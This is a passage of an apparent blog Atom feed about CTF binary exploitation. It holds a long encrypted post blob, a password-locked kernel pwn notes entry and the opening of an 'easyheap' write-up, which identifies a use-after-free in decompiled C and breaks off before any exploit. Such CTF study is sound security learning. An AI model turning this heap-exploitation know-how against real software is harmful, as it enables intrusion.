YwsfO4h2ttyjIInvS/VKKUKyJ3JRnRSmeGlAMaPsTk+5/sDFx19BEmv5U0f36mcQF4IzVz0Wb3h7Pt7mMAhyfm6q7YQFYkMGyVFz7VXogAJ5e8p3o7w7wu7kKFQdZs1MKua13kxjohobd/t/Tilig11CgUjOZoYQKpVv+xzfwL+2cbZwiY9bO4J0/wqCKA4nUD9jrhN4ZZUZp5bM+uDrIvK82fbbmteIprAAaGizDaEHET3lFC/IISFT8ULazzBwlMBRAl/7kFFEKLYKi33Iw9pcPSSiBhn2F+QBgRXOUc5sNNTODl5CqCrFMKxIjujMAXhT1ZSs0CbiJxNoSU9SHvJrljq4J8o42CyJ+JYl3kI6P8oHEdsw3x3zf6CsVxzfynP0OJcPFaIKek7AcNRbvOVBopRjmaE3uum9pzqgrk27XcDBko4Fmz4M+UrlkpdQnSoIt7jPx0B0wGmU962aCUwr3TE2FGdTVWwj/z/WM0sMRgDZikqU8yidGxcSC//R9wa4uQ9RttQYMuUUIg+M9hb1lBNp2O2FBRJPIuV1P1EOhpcEitf8uTuj9OmxSfYeBSQUUuGUzCjUWdlaPjzeCUfbIqTNq66z/ziLkEBI48LVzO8pik20VW2esSSssAkRm9jKYV+2w8389H9VEuqKm54Jb8Rwya8gRi98udLNSBdnNC0voBfvQgvsU26CCjfc0VTS1SqAdWVecGC2d6nsy4KV2OYJNaGEZ9CE/RKVN/daf0cAfFpBJAyymZoFeLqp2iYlVwYWhedQPAV6GZCI40Vh/L5Grju3V8cPkgU1MzTiqFaMr6Xaevkf7N2smj8LSZ8HVdFkMOVZMur7iTWTPWl0JeAQ9NGMxM/wd2nS0iClFkbHJ8fgHXiVKIZ0nCVHPPdUAXOft+jalzVuJAmgsUCaxhnf30J0co3Ll0rxJcMSVKlzX63Lz50I57rmxuS26v/o+weSExmeKg7LOyZi0sRv7UhqmRGkH6/lEffzIRoYt+iRJMQ1t9r5KlMSHzAR61O0vFvMS19cd3GDqvpDyUXtTOJ/ckqfDUGaSdPKjJ5terVOfK7ab/wSUI9NM+naBDjkE+nu4iDzABhW68B3SGUJ4QQEx2J9hSpfsFwCRCK4hkyimfcvRqjKHTJ82QxnSTykeyDL5KBsqa7rUvPpzOBxUDOCcACZ6iP7q9e0Z+G38QZqCbD3MGOMo33x/0Z5RlbjjasiHK+rJk91GSK/Cu7FDB52Xp+U7euSzNc62CBpeBeFAG/vJORjLfhFbA6TGnyhQmWPhT/RBjugVX7FZ3CPTt1qGjo6KzuYvtCPwvP600hxJT09ZQuuyU9Jq8Fw27N+1xlhVk6hhGznMOtz5UXZ8BdtBN02pNjAYOHEq9/2RaZ1MHDzv2QD/eNitK9iyWwU658sINFWewX95qrXB/EJJ3IIygAolZr0V4R7uOm7x7Lorg/sKGDfBWcOHdkR3lA2Si/Zb8dX3F4F678BmSesrC9oD2Z1ZrYOKd8ORvINaOnzl0sOjKy+Nk95WfJJxxTQnsWKYrETcDeT3VQrB6Xgm1hInWj85QsORQX21iI5V98BPfqZu7NxNYuBd2W5xsj0NaYiHrnWEDhXB+iJfNafDTXG2RFTlmQUDHj+jdBrCpAZW2xL2x4MJWdcC200+0pJZ5smJ+H1jMNmaph7c4HZSvrDVVKwvZMVBVxjEb/GGQbbqS7raEgxeFRThy+aX4NxokT4XLBNzdjgW8rnTmn4t6CJ3N5/uIahJ+idAINQD9GqnjYJEWzL0bhaaQmLXEgRASteAv8iK0UHTv3W/McmAHuy8CLK62CsjmoeU2bMXofIlJp6yRTJE2r0akKz35ZZZDTt+1SWBPOCzNq5NVxy16zC3B7qSNM4BhZ3YVVJ7dnd8/uQPqLRKr2PU792+H4OP/s+wqK87Qsk2cj6lzdOxDrKRNKrmdjlqPBbEJqHmRolQ8fZb0p7n3KHvIfU2awD+o576W+Janef/Q8Rg3MHWoi3Pfh7CfNiKMSFm1PY2HGPrjowE38l8R9+YgHAK+hP7nuYRUOPfj550lnzeAu9kgrs+FfnSzOhSATwlzeUjwqYGbXd2050ULRkkgvtzZVQrz86Yb6kRZrkHXRO5EYxid9diP4LKpFQv9uIf2A7w7YbDnWWKoPNmMfbWL1SCoetVXjN1gcs06jEjatnlfwpRUjBwd+UCGe6rpRROWT2huEM0kPsCU9oJyvcQCls/v+EXNRbO6QXOWbBiSCieIk94Oy9qn/qTpVgsOM4IKZTGHclYE8kw4BMDMYtmgi25LlI9jUYQA6uox3b8ijvlK6XVKUHNJTN2ghAyz5ytK4BylneRGy+9NmOf694pePqyOLpQ23ZqBj+4/vZHVkvw4WYvUgxWDiYec+UtfcnZLwLiRQxZQSz2R2QvXkUfn2xuUtjFJV51MnLGpNFRhlqBVL+HZibip+dIT03TLtV0bwy1fN/+I4tyCxeEFps6Nwfwwh0VF53PVdZ6LdtvVon0Aarvv2A9F7wf9rsKj/DnJCiB7IM+SS4VC9AmNq+jFYz/V8aha8nyMA6AqUbhdEBq4sMFO2dW/5KcNrvuZvKz53AFyBBQGRpFVdnUu5R0g4MNnbBnyMbXbNghaDhSoQQfIfLipdcBWsWe833pWbxllerpk4Gyu4S0uWVIkxeq+jfgo2xhkivZXivxl6Cvmld+U/RmhWaQJ/Xdh2XPcR6Y8Y58qJpHNMAM1SlQbwQo2inc+GSh7iKi3Atf0nk+ocWuJ8pBnTiDB4l8LP8FCCqcgeky6/q08IOnIFIL47gKJs7ucF0h9yVQi48ZACST2ilwnZdHrNhcmhuVSoT/XvcBZ0tUAMMlEcNd+fidvi+zblOz8ZqZTqyUl1pHFajn5M9Xm9pa4nZOQ0+2aXVKTOdSmxIuINohbb32DqdxHxpJwjHpjXQtEo8VWCesAYwbwnutEdB54bqnqkvLK7YXrz250XJoZZZXXPDH4aUwUJJLpeK5xcia+W7qQMQlFbM2ABiiNfpOYHmP8CK+lNYLvnUD78F63TZSu9HlIieUE3d40oVfIsKWJ+ZvYCS9DD4bzanI7P8R64PwpGN5oEguL6a/HwE65ANNRUYbwDwrBvXtg8Zgw/6SAMbWgkVJT+7IZrzPg8h2scEhFjuZHlZEOKpTEnlG7XUX+jw/WvZjr4fMBRPYtL78fR6AXFVwVYjgT2FRybsMdPQ/QCXyUs6d9q3VxjHxSVm+ehqXQMfqL8rkigcKCeBYLACXOwCgLUYreM0PX9/9k0Vqi1gT3L3VKjSz69WkZRqOWp49GlhpHMDsyx0v6cKSm/Wh5EwYLcnloxEcjo9ETczDx2Ks+wOH1v5aT4FsNkx68M0ehMxB2opGzsgPomQcEkzTroZEIL3yvKsrxGrEuLcAmcJwXBSNFSHmqwFiAVHn+8UC+Te1ISL9Ik02q6wd7YBgIThfkACaCP8t7TjTuhVKjtdp+R8YDlsYI0YM7Sq/98IC4ZurQeB7r7naaNkS2gt0CNuNWrzUpJFRRD/OKAe7KpvhzfuFXqcuaZLV4gwP6hSZrPQyVttv/TWd/oLpIQTc3poBM5Jjc/YtBzlDiUqYKbERdJaSFK3jERpTOVmFvjBtbS5NVJMuNssF+jOcx3Ae1f60A8SqVSqmOvdoDOePGMP5X2r4s5M0mghe4eTKpz5xLVsa/NLb4VFN0Ivj2nEsM8VlR5zJrLjxEbh/eRKb1fqoNzMOqRy92SYKlFp1lhvaL82IAd85ZFpOm5mQkXbuIyuU9kuy7l0QCgAS/w9VOqJRUbocusRhH2/zpBoEvtDKKmQDGINi7gssU58UHDOYVEYQrdIQHVDtNuTxyAVUtynVnTapIGPSKDoUXr2UbVb/X/KqQBYXdKiM3s7soNquwwuFBi/KFARV636QSTgP3jJCuBnjSD8mIBjc/yAGTkIOSAkvHsnBghGqf1m1FV/F2eMQ+XNKG+NOrev3QXxrpJ1gFQIcpaNaPd5pWCOGAWCO4Nc6hZ99EhpM3kaFquqGkRJda1yj5X8I+lhX4zVrjs017m4e15de2PuCEq+H7Le0jkuKwOkyb4FQvbf5quOgACRFcxVNgetb+WRokPCmxlTQDsIAXEjTDHlc6Hfq0ZDwRCX+mwbmsDj7nTnOfVnZOBhNOpuxp6XkpJjdt8xFNCGDPdoZ8VbfvENGumtvXcvUPvqtW78GiGfymHgxpfAdcisl4IFeE2g/waufNjgdUEILDRs3BT3G7p/m9wZQF5PKReM0HUgA6dZGHu2Xp+vVGFJdj/VeTmiOUiq4DtA1ReAOedsyEspstmzBOhuXc2iembfKJMaVJd0xzsLUYiB4bsOOvTNHnhLZxzw82TNg/S5GWFgHrBeyngofNf9Kd95sSd9Zisbjwvckp+H/mm8BX6tm3HiMecOUKKpoils6EyzvNo5eE91I+ZVrV1e2MIlgw0CBHh0cvvrl25HQijLIvf30wgKfvDNUggD0hAt3s4lUCrRuZ/NKEBFwgYI1oqiqufSXywiyU8TGL7U/PtO0acj9rG5GptRAPXKDed6s4CfhD4RBt8Gt+pMyJWTuJFrJJbXEg4AaPSpt/27r2M2Pz/B47kD+gPaF0+ew6FQe/h+GzxDpGSX6iBfkLz1wHt4RKsfH0cN8CQd8CEBUgg5iBXjrKpZ4eUtMtI+zGFCeD7FAykFXepx9z7wWpS8hervv/cEsCJycjG8s0ilH/W6xI4PAWJr4i3C8c3aRXUCyBO0MqH5wCMnkdpkrFb8toOniBSEdY+BDmlU8SGG1kFddQBExI9VpaoMhYhRVyj68LaL8TWbDNvu+LRMZ0rp49hixcmGSkCf5VM5+BQfqMDKGSR7z2SFNW9N7fzPXcHx/d+cWXrdELbJ0cxzyTZQYav+vo6GxiyJ+cTjmE+mh8Wf0TD47RYYOdH+yPYOLEhax+CtlfR4RzlUAGylNA77/+C3e7Cb1tmkmsoI9jb4WVIhMYQDR3kFwqMK6ZZQCvysDDhVt42UQY3XFXd9fxeEvB67J/QCP58uEkA0Oy3ObKoiXHBUK+qwYYZxIPVF0T6MYhDZJfOUlpPG64EwY5FJ9/nYmCxdxQtwwZGlVMbl49nPH2v6YBfkp86p/RiRnQ6Gkv6l5iDCb8TPwRzt6A3U75ppVJxBIePAI61DKgpQnmc7UyDHtuRSAFDwneTwz3rS60ReXJ/+vtaD4idbglwR9/ggpk5Plxe/MYUuKn4SDsmaW+YZhwde/gAzrd5DBUS4tOxWhnKsIjaDqtgLuS0Y5TL+ipoepJCDWmeN4ffUE5PNGTqew0NQNEY5pjuiWKpO0UdDl9P1N0bSnlgxNKp9iSVJxIRiYxlqWzeDQ97paEBteFHFi+wAbhg62kgbygnFDfPMTW4Xrkw7hSADohTC3HlSnOmPdgmjiAVChPZ0QTYofzgfX4YTj3P3a+b4ru95baSoEfTvmIuDBVCLuf6G5B+j2vzOcOUA4omQtiYP4RwTSIXtoMErGGbL4bfo9U2Cl2YCxlxR4eXceZOnivXr6LawnvftUFAOlKxCmOlFfRoa3F9VBF9PDNlnesEnMpb8vPewIaxpkoG6EE32mR3S04iQlZ8NRo5zQ61PyBNwJTM/r4I/26wsGYF9CTfSPhvpyjLXMCUn8aiHj+XI+dTQAd6SYljpd/N5Gf30x/JC7IKN2/emK7dLX4UnzjVwpVcz2UhnaOpqsNVrYO7sds4XrD7Gzo9n+H4OkIkIPFPjbDXLSPJ+8f5Sdnlj6UrHrYsfyUWHYrud/WZYwdX1g6DF7o3NoW/2odNAED1b/N+wh0g4d/DGNWcjwdw/wCpY/vMu8OFxTfF2wi26fxZKdqucgHJkmLIGnEK5DqBYyjmTOXIX1FMtsp9j76hQCDdrzbMtHQHbvSNOwwNbri37355z/hgTUNHyi6+erTRqcIjU55JXdX0SI4WJXD8gE2N3MpYDGGWADQZuBVoIJtz5SSDLsV1VeIl6wKwO0CxkYhWR5FlLonpssyLeSH2v5kuwnWl9Ynomf253Hw5B5YT//N6VPbxPkUJQZqOePUgobyWhRsLvz6AzIbd0S/rzL2fm40a52g1V47W0IlL8IoBrjlCplFjwEnEKe3SWrjazilZg6eAqJVDA5c8NkXYJ2jSGloDu8szrDo4dwbhy9msxU30bg+GuWXv/kn6ZkyvVp2uY+kbLuSYV7wVzEASHIKGicX/uYOb3T7nhGBZsgQWoEsa6iSp4C2EBk5etVi3J/qw3Xlla083s16ZWnjAduVZr1Lt++7tz4rGhlgNH9LCDpdm5vdCce7z/DKkdwwJxrfBL6jCpRcXGnyMa/HFG4GTEDybyHTXN7PA82RRu+KSwUsB4ssuoK9wVbhvFZn0q+cx7ICGF9GgEG/31YfE4SDIsc2EjFrZkRZn5eZrHW5twb0iQyMp7e9NoF5ZAxnySkSMpYNylJvZUhOkbYqEzri9sEN1sNSsX3563lGgKWfPWr5aBGt8/9sW656o46vqnLEm7kkIsiLtnANQbUXpt2RfHU1vx+J8f/c06hGF6Nm3BSJhLA/vBPpt6wGl9SnroME2PnoIuVSSWasMBKnyD3J0eJPaCARlYm1tdwb4V2I6ZXP+zd94A1DWH5GyMv/voZ12394MHJq0Jwk4B2Ui07VSMbymYgyEkvv81Qjn3azKBr3abgpsJ6411D+l3hkaJP3b1PCNkdxdOTxOQJ1HDPhxhxcjNN+lTAxnbNfP4BtFr2uBe6LTJI74LrqZRuDEBJVcJOCYUkq2OV6WjqCKF2Id85QNL/sKmiaw9PKp1Rl338r3yKMtOKP/EE0TKLPvueS86aMTi6SiL4hxyjv2PZ19HvrLZM0aUBQY1pY44ci+4Y6x3daJ0FuJNM+ROiSbxzkI7byPlMabZBgwS3OE2/4wM57uw2/l6ki2WNOTClhDi1ga3Z1yP+C6BIOvi8z2oURONalhrqSreEsF3iVn4TCTtM/SG/49Mio62DR+ZS1561X8pZTtoTnui46hMCO9CAHDt2pTLgbzks9XBdJ/V7vYhZfXAL27RxJAMbtTXgyoZGqTOqrHyfqjIUrAepkeQ4OD4cr6gi0JM8JCeb3OvOqJD5szmCY7nIEx5CHe4Rbx6cRP3MkeTQRnzy6ejXu2LA/VvBZdINyfvepGk3xt0DmtPDhlOcefmAA7r8sLzF0DaMOWNOHDN9zWJsulfy1Fqe+6R+oQkaauoeZVGPLzJx0IRnUugzJ5BjoBnVvyaEhV16PHta/rzNSwW35nYmFfZWmjv+/c1l8Y/TH+4149aCbbjYmqDOnPHd4/f4NKsmfan/fQpRbeTlsjH+dn5dJJg2NKHLamnVvBlEGLl5jneCu4PKgI5Mn9SX2CY1lGpiNpckWg8caj0ubCO59hkWS5A4ZW+BPkSDwzv/qifKQD1bvaQVBTZA4vKsTj+MoFb7L/zhaevx5PmrNqXx1lfZ3JlqiKhhIteNNSunQHkfMFZsf7vBrawZubc5igjAhqekhO7C/PZ2mKTzaYdOEEr1s//24MC2cIOrYNdhaSIn6DJCMr7Bu4gXW5EBZdQyVwWhxnenKAp0LzeaMNu7x1HQZ2ECykv9h00eha6ylcera57ezfgmiUsvq8qYWb+MLS5GmrGMMeo0Cmjosz7Znz3aJvzoWVw+EdILZO8C0Nwa6B6dm+H2XmDH1uJHt0H05ndGoVuzHr5zLepy0J8UC57AMaLPr7+wXWzllDbkqXSs3chqvQl77/Sj0QaOqdMq0LaKYoSNNBTgS4Z/c+phrEa54P5CjgLd3RFmlJqo6vFoqg5evp/dwq+2r2BZPzLPPZ0ozciaPyvvKVfLYzsjI83Uz6ZBl2B1LsSTUtrDWRyZ9gC/aDwhTETRTlkBa9SO6NIcoqRqrsalA8H3k2yfSyQ157M/iXcrIYmjlWPbJ733Dt8XMI4NxOAehD9B6pmxHWgLHxavXdQxXECSM5mHeeudIz+txcFX6NtjcCMQvhkyKq9HobZ5jtnoyXDEHtLpy+a5G7+ehlkV+kXXlQ4z++12R7hPgXYKS0UBtuF/Pye7u8P9t5Y24pRoqKd6BtH8v8EzzKA9chsjL0x40C2eYSshq14Qx93TUNHTW96kZB2Z5DJa3S34M6c4JLQJhv+C2P5rBHVK4gnHxgaJl3bO9f909Vh+cr3p23o5OO0QEldrrywoyYf6XiiCrXovgDxAiId/9WEuDJV6Z+S7gB4p4PstUsTHqBZnRLT3UFGoThq614XTjJIF5AfMmC0D6hKFh85A34Pr4ovWSHEZfevQ0EjO/cOZAQCj8LMfyKIsyk2OUP1t7Q6VbbWOSA4D3pmzpvCL7b9VomMAe5lzt6AF+94RxjA96r3GYt6OQ18ZZXgJWE643MeLjTUbtKNklhuAHcaMdDS/pLz32dyi+H0pRaNRODkg1Pt+cRtfOIKxQlOARIqHjTZ/01z921vmobaUYygxqIWUTKT0U9FxHk7wOTsAdEiEep7RN7VsjEY+3UpIafJDb95FgFtmmGAoOPT8IfS4D/gCKp6jEk+czpajv5Jg5xg2jZGzV7w4o667QrOHkSA02a2sPSeDmdcJs3fQkACbPiZOCC+ljc+t4yj5RMz+qBCciyh6kYSXFD3q6rlK1XMGsaHqfCYcPIsNjV77BLboAjog5joDfSoQ0IJLT+TnuarqReaKN+U7WpJvnOsDQAL4jSg/JrLQPNqDXyMkqyA5YGH7iN0KuLoRF7b0srnwartHY2luAPzpUgOxoq9HjVRYgXjgcQW9QNUWEViAtEElzDfdBcFM8dnKmxyEfld5FGw2Oa+8Zd3AEGtskkofSsNGHDS63305OvxYJC4SMrGsBLMzUgxWJQs97QmBXyPuN1PXmHsB/GiqxTOoh85hfsdAZ2lOFHVGbChaTiVosz/qZZS5APVxLhxTSoo/rNx6uUDk/3yVwBfkXRftH8uASMuCuLfabpgX7M6HJup/IF9+Z/55X0kEHvqPvMIoEIAUmyyuYw9KqmpaVSxfbOa8+E5jbKB/X+yGIERHGHD8cHe3/6dYvAUDPaXLApZPq2cuTdUFJDO0Jsn+yzh4vq7W01qVla5ry3uUsqT62jJDI2/f7D79eLjwAYvcvyc6hOulcs4nYqfd/8WkZl6OZQfRcfOfstvnJLEr6eXdrA/LvMDOufTuKx7GcAWT2ijxIA4yFEgcNk3bZjvXXhkrWHjEX3gKbZ8ne/CSmDibtHgghIFecVGRAJ0EbkNoO7n0t/4sprQHSLi0BMSlFxRHOojj05bnUmd9963ERe9Xg3mwnnoFPUt1K6bFKR6KL/DoBrNhzv/CVb03+HpctDnA9LlzdoClm9yy86AyS7WtboYeWpcBYfbzQxXctCrk87zluISKmLgjBeyL/k99s4SlwxpOHJ3tmelaFEVVk6zALFoQoADDjowQcoPkcSVrbGG2h++2FhdjuyfLrtAYUfm/Ux+IRVZopnj69NeLiVVjDIpxhXXmkF4q/kYLulQjtT0LQidJbTuzKVbJWbgUS10log5YNw8Emg9ik46Sc05ZVhMU7Y5SE6cT0gH6LsBOuoGwSVW34xCG3CshEbsH041p0WqqSv7ZLbmMeDJ1OGtKn+auP5eKI/ywdOGtpWG7TsYvBaL1+fT8ku+DW1n9SA2Xi9FRi4ovr/9xe7cLavroOPFOcQJtP1z5gBuuvz89Oh7KlQJiDBf+ZERdkOiQFoZ+EVZpM+io+WrWMkQyJjDUAPEyyRA/g/FkOzeJ3+atR5BuiWsAkj56CMi/Sd1ZjaSmZSF2v0F8pX72KbpH4IJtI2xEc2ApjF381AubVdLh1MSlWfJ6n8PB3m0IcFiWkkr0T4QIx9+kEjcrvGCXGb8KzQeoe7Zdgtr3xVaCXZbV3LoKSAifYlrx3IMX8UINFONoHhQloV1LK4jV4cuCOXC3U1kkBJdKZ/NYytKg5qwOSOWzCcSRrDc4TUwo7sFOP6440ERLQmiKRJ/BANuOHIu52hl3FuON/my6zMoI3sHpskamPn2MPgXaLlOWYSFrJXK7DG3fOy+CrqxGtVMEbnx7XiTtSChoB9JPH+QMn1xK5BIA2YjVKGNFgMIOX1+yDFwIseuowrcymzwNlLECE/bMiSkhQAQTdmW74eL2uFeJdds7CvryClV/TdSzb0W7A2kx1ohTaelHvpOvdKDeCxXE2vJmdI21IIbkgEBfvRzSC4o65gqbyESS137qZ4Wcj0MA0lhScqO7G54fN4psnOuk1SkjtS7SS4U2/F8LE/0bAJPBjmgck+2bmtpCEukkMIpiq+sgsh2KKS9qwheubIzhEoySaiL49HLyY+kWJo0PUSgcZ+115uj8zOYDSLDMdfro7qhNTkdhKhKm2arvQfSQlZ4rUvDrtTE4vTMiYyAfaaDiRrwXpIuAMRL0AjZjUx43yVVVgg8eOeHiMLQKjfrAYBsQz8kPIfqXYKXiyjpYH+cTSauaFxOHTUZWAb2fzx/0hxBfNAhWQnmr+riNR87LsWxj3RspxL5JobSX+Vs+4q5TyQKtaosdcHtiwH4gUngBdWf2M4gooyIgrtU7trI8mloG7/X/1AWKC8IznEp2KB4a0gZ8DIyvZgHgMo8KvKlERZpNwXOWuYJ1ETBRScgw2iAbySr+QU38c78jA49kjeVzAqVxf0jmr1mdYBKhUmNTMyOae2H4Yws21JtiBOP3nKEGy2xLFpjuUTRonj9Z1wsHc92G00V+/Y+sMBZSqeJqjpSvIOLBtpBJnE5es1r4hEW+yOc4iNAMZqXat4BjZmjdw8Mjsa+4FXEbEifHxiTCALqJGvV/wQMVH0OsQxtxylMCxKtXBaUPvsDaEGXUrYtIkxhNRORNy+9feU+JDh6gJGd6xT4keckdyUetRASWgrW4w1hm2uYkISUXLb28xWRp7xtGmnkkF6Ju/TJ6PitsSMOieuyZTkVhTlhYqdXmMQMkQrR2Ivo6VqlcIJrmiNIDPXdj59iZguXr7qHQsRNVErJ2O5+VeAWjVSEUFwlMcUlSGF8eQxTp5LfXyIDxZ+yDb++SpqtG7/TcpLPPiz7i2IhRlJHX2TC1DjTdz5udZODBVRHIUmrxYaFUefghN4/PxPocU0cOOW5uSVTnVeR5K1gehcvsxmUaZuF+PmCxpD5zvqKWh8aNorPN55Hhn+3H7m1PKMDsd+//9DOELoS5E9VvMgR/18JipwwnB8aDvaJV9Kjlmbdod4KdIPRuCCnNo9kZY4xNz0hVaoaIqoEbR/Y111NykHBJvYLn+TzP+6P5UsQoY2jEnmw6fhQZvpSznYQRl10al7ZUiFC7/n4lizChXBt6N3KTB3m946uWKw3ToS2Gc1dVpdZIc7AHLFeE0CInZCz5VHUq2/6rp8Ug2gBV4VrvktxhVRAODzPqahEUy/8tPNr7HYQj90OZaLBLfuA8NEER/UCj/3KpnmWXOVuuvIIodfx6SW3bQ+G4n2D5v0svl5p+o7YpvyXWvsOMz2WrQXngjHbSJX41z+fUFCw8hZhY2YTztx9/ITenFf63ebTSJXE/HlQNol0WJ87o38wqkVw8K0mlilr9XCx2Rgypd3dWBoDtJf9M4ahiOsK+aW7msdokd4k2q3fOQB1sGrhO650E9prbUJN93yqoDHtVE1My5wnkOkywIknvKB1fyHw83DwaX7JBxAuuoXnyPSt9jDtze7zSZQI2W7WmJgNqdDO/oWaj+sl+mC/eGzUstQnY0mJAeQeBORsSEUuTP8XFalk3tJBxQdqFfsLStwLneh7PzYnws1oq6uXlS5X6lhSbhdnFG/gWbYc9TR8WN8QSp4cCnUX5rrTATHS7Dc0/Ay8yMaIxnVfxwjlGt+GwGQaQ9TbsBeq8gdVRNBnCLKhyoAWYu4PG5GWfCOnRG4usekVNZpk/PSdFrRs/c8zAnDhW7rY9zbvU7JtpqSwMtyir4hpWip4u8TNsgYnVpkCya5jFN4aZ7hBAaqu9t2g0VXfMjqzdwKMYfs37qSVgQy+kcNrN/Yvk8nF58z3mPlvbPM5kZN2/wKYHvpBgt5KPZAbVJ5thaijmlYU0J4SPr9zI5fKjKdW+sDdDcltNaUWEVnFSVvI4WHUdZsC94D0x0W6TDaG6ItZjgk/DXwKM1LZId/Agdm+0ncGwfl/lWHeVTYylWaSpw/33xO93ndI0rNuPUG/31IhuKYQiVWKH1XSeDrPHyEgO0WISll70KKoaMcAv5G8omqvoc44vGOSUOSn3Ep5LTT6rDA46Bdy51KQdfft+p5+JXUMiaPnCSxcMAa2xdAhvZ7cOhN6bJAGTcmcQx0SYm9pip33AWAnnkxgQOky9+H/b66v2rB+uI6V3X0Lj4G1FOWJt6n0quSz+sY+Po90EpuwSOdrzTud/3CNgkid6mHyCU57qVPeVOnrumOp+3DCfxQ4CGX4XUQpQtkh3jX0mke4MU5vSYLyQQURteIv1+ZcrXzyZRs6R8YQSQ+VGYgOcD9kOQfb1qDxEpqDb0rXXrLMy2shp+UNYqNMF2UtkSI3t/CGAJYgfy38+q1ebcMh12M2oHYjpOelUoYhfZgyER5ImAlC9wLxLXRg7qxOphfglL59WS+qaTpJ6SGeaIecuRxsQp2hUuf7XA6khrERBibM7kK9xlE+aflsPXe2pSXEh4PtgOT7ETcWALS8TWDofnxFUMSSgEHMQgIy0rEWNoOlSSWck1zBkS95UeaSrzA7kcEJlMCtFlFTVBLZBuct3ycItCdPtSCR8MmpYXf8KNDnjZj+x5AM/jvzFeMJNuw4H+UXxU5K8tnk31Tjkdjjc9QyxMklrTUM/9j+2+7fUS4J7P60zY7iC95+D19NbhMY8ZXhBdA1mivLgS3iUv8FF6XtM3IuoS9LDNAZrhhgmPsZqDtd8zdDyJmt12oWKQtT7BZLzACSZQJTbUTAFPC7hRjSDnbYdY21WZMYC/7bPVss1CHptenZie8XXLInj+zpN7RLfE75R1tOT/O+hRhRpUrl+d6HmEzV7AqZcOO0Za0oDtmr+PwidoL6DUSOcxP/4udy8YevnQ/qy4oCvIqgqjZowEGz4lSVVsRvssPUbWwr2/0jr4Ar6wKA7MvNqQRHxxdtQkTCwRUifVh3imVP9UDkuzJPHGBPgEI76uNhY28pztdCYKKd/T5esAjK4tJsRKNnvhgUXbjnHzxdYFobx0HqhelVIX35wdrbFQsTzzDcByXf7P8jh940oDzRWII4kp+mBZWx8T207FQLM+lXR3mNYHMdT6Q20rD9NftUTAlyiErDMAr47m7fI98/wNo/HDpyaS2YkoWVxQoL8NMzwn9mtGaOTMNVPZizVoSm37RI5jV3qzMP/j//u0zVRuKx2ZOyQBKXwoc9c8BByhUf2CqDPK5EM3ga/Tz/ItkbUgLCpcAekDUJFlTvVsPD4pgOdFLwX7C0kDIb3vNvJD6yTRNaxrbG2B7qqdqBHDC2DyenO </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>kernel pwn学习笔记一</title>
    <link href="https://nocbtm.github.io/2020/04/16/kernel-pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/"/>
    <id>https://nocbtm.github.io/2020/04/16/kernel-pwn-学习笔记一/</id>
    <published>2020-04-16T08:49:37.000Z</published>
    <updated>2020-04-17T04:39:27.465Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>iofile利用</title>
    <link href="https://nocbtm.github.io/2020/04/15/iofile%E5%88%A9%E7%94%A8/"/>
    <id>https://nocbtm.github.io/2020/04/15/iofile利用/</id>
    <published>2020-04-15T06:35:24.000Z</published>
    <updated>2020-04-15T06:35:24.169Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>高校战“疫”网络安全分享赛 pwn 复现</title>
    <link href="https://nocbtm.github.io/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-pwn-%E5%A4%8D%E7%8E%B0/"/>
    <id>https://nocbtm.github.io/2020/03/09/高校战“疫”网络安全分享赛-pwn-复现/</id>
    <published>2020-03-09T06:59:08.000Z</published>
    <updated>2020-03-10T07:09:53.648Z</updated>
    
    <content type="html"><![CDATA[<h2 id="easyheap"><a href="#easyheap" class="headerlink" title="easyheap"></a>easyheap</h2><p>程序没开PIE，got表可写</p><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>ptr[v1]清零了，但*(void **)ptr[v1]没有清零。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">int sub_4009E4()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [rsp+Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  if ( ++dword_6020AC &gt; 4 )</span><br><span class="line">    return puts(&quot;Delete failed.&quot;);</span><br><span class="line">  puts(&quot;What is the index of the item to be deleted?&quot;);</span><br><span class="line">  v1 = sub_400890();</span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt; 6 || !ptr[v1] )</span><br><span class="line">    return puts(&quot;Delete failed.&quot;);</span><br><span class="line">  free(*(void **)ptr[v1]);</span><br><span class="line">  free(ptr[v1]);</span><br><span class="line">  ptr[v1] = 0LL;</span><br><span class="line">  return puts(&quot;Delete successfully.&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="思路"><a href="#思路" class="headerlink" 